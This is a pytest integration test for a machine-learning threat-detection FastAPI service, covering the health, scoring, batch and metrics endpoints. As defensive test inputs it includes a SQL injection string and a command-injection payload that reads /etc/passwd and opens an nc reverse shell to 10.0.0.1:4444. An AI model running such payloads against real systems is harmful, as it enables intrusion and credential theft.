"""Integration test: the full FastAPI service end to end.

Builds every artifact (generate → preprocess → train tabular/text/fusion) into a
temp root ONCE (module-scoped), then drives the real FastAPI app via TestClient:
/health, /score, /batch, /metrics. This is the "model inference" coverage from
the resume bullet, exercised through the actual HTTP boundary.
"""

from __future__ import annotations

import numpy as np
import pytest

from threat_detection.config import (
    AppConfig,
    DataConfig,
    DriftConfig,
    SplitConfig,
    TabularDataConfig,
    TextDataConfig,
)

pytestmark = [pytest.mark.integration, pytest.mark.slow]


def _serving_cfg() -> AppConfig:
    cfg = AppConfig(
        seed=7,
        data=DataConfig(
            tabular=TabularDataConfig(
                n_rows=5000,
                benign_ratio=0.75,
                attack_mix={
                    "DoS": 0.35,
                    "DDoS": 0.25,
                    "PortScan": 0.20,
                    "Brute Force": 0.10,
                    "Web Attack": 0.06,
                    "Botnet": 0.03,
                    "Infiltration": 0.01,
                },
                inf_nan_fraction=0.02,
                duplicate_fraction=0.05,
            ),
            text=TextDataConfig(n_rows=3000, malicious_ratio=0.30),
            drift=DriftConfig(),
        ),
        split=SplitConfig(test_size=0.2, val_size=0.1, stratify=True),
    )
    cfg.xgboost.n_estimators = 30
    cfg.xgboost.early_stopping_rounds = 5
    cfg.isolation_forest.n_estimators = 50
    cfg.lstm.embedding_dim = 16
    cfg.lstm.hidden_dim = 16
    cfg.lstm.max_epochs = 3
    cfg.lstm.device = "cpu"
    return cfg


@pytest.fixture(scope="module")
def client(tmp_path_factory):
    mp = pytest.MonkeyPatch()
    root = tmp_path_factory.mktemp("serving")
    mp.setenv("THREAT_DETECTION_DATA_ROOT", str(root))
    mp.setenv("MLFLOW_TRACKING_URI", f"file:{root / 'mlruns'}")

    from threat_detection.data.generate import generate_raw_data
    from threat_detection.features.build import run_preprocessing
    from threat_detection.training.train_fusion import train as train_fusion
    from threat_detection.training.train_tabular import train as train_tabular
    from threat_detection.training.train_text import train as train_text

    cfg = _serving_cfg()
    generate_raw_data(cfg, force=True)
    run_preprocessing(cfg)
    train_tabular(cfg, register=False)
    train_text(cfg, register=False)
    train_fusion(cfg, register=False)

    from fastapi.testclient import TestClient

    from threat_detection.serving.app import create_app

    with TestClient(create_app()) as c:
        yield c
    mp.undo()


def _sample_features() -> dict[str, float]:
    from threat_detection.data import schema
    from threat_detection.data.loaders import load_tabular
    from threat_detection.paths import Paths

    row = load_tabular(Paths.tabular_raw()).iloc[0]
    return {f: float(np.nan_to_num(row[f])) for f in schema.FLOW_FEATURES}


def test_health(client) -> None:
    body = client.get("/health").json()
    assert body["models_loaded"] is True
    assert body["status"] == "ok"


def test_score_single_event(client) -> None:
    event = {"features": _sample_features(), "payload": "'; DROP TABLE users; --"}
    resp = client.post("/score", json=event)
    assert resp.status_code == 200
    body = resp.json()
    assert 0.0 <= body["threat_probability"] <= 1.0
    assert isinstance(body["is_threat"], bool)
    assert set(body["component_scores"]) == {"anomaly_score", "attack_proba", "text_proba"}
    assert body["latency_ms"] >= 0.0
    assert "sql_injection" in body["explanation"]["triggering_indicators"]


def test_score_payload_only(client) -> None:
    resp = client.post("/score", json={"payload": "ls -la /home"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["predicted_class"] == "UNKNOWN"
    assert body["decision_source"] == "text-only"


def test_malicious_payload_only_is_flagged(client) -> None:
    """A clear payload-only attack must not be suppressed by absent tabular signals."""
    resp = client.post("/score", json={"payload": "; cat /etc/passwd; nc 10.0.0.1 4444 -e /bin/sh"})
    body = resp.json()
    assert body["decision_source"] == "text-only"
    assert body["is_threat"] is True  # the bug fix: text model decides, not fusion
    assert body["component_scores"]["text_proba"] > 0.5


def test_score_rejects_empty_event(client) -> None:
    assert client.post("/score", json={}).status_code == 422


def test_batch(client) -> None:
    resp = client.post(
        "/batch",
        json={"events": [{"features": _sample_features()}, {"payload": "cat /etc/passwd"}]},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] == 2
    assert len(body["results"]) == 2


def test_metrics_endpoint(client) -> None:
    client.post("/score", json={"features": _sample_features()})
    resp = client.get("/metrics")
    assert resp.status_code == 200
    assert "td_requests_total" in resp.text
    assert "td_threat_probability" in resp.text
